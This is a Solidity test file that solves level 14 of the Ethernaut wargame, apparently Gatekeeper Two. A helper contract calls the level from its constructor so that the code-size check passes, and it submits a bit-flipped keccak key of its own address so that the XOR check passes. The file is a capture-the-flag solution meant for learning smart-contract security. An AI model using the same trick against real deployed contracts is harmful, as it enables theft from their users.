// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./EthernautTest.t.sol";

interface Level14 {
    function enter(bytes8) external returns (bool);
}

contract Enter {
    constructor(address _level14) {
        Level14 levelInstance14 = Level14(_level14);

        // Flips the bits of the required key so that it XORs to 0xffffffffffffffff
        bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));

        levelInstance14.enter(key);
    }
}

contract Level14Test is EthernautTest {
    function testLevel14() public {
        _createLevel("14");

        // As if this test contract were actually calling as an EOA
        vm.startPrank(msg.sender, address(this));
        new Enter(levelInstance["14"]);
        vm.stopPrank();

        require(_submitLevel("14"));
    }

}
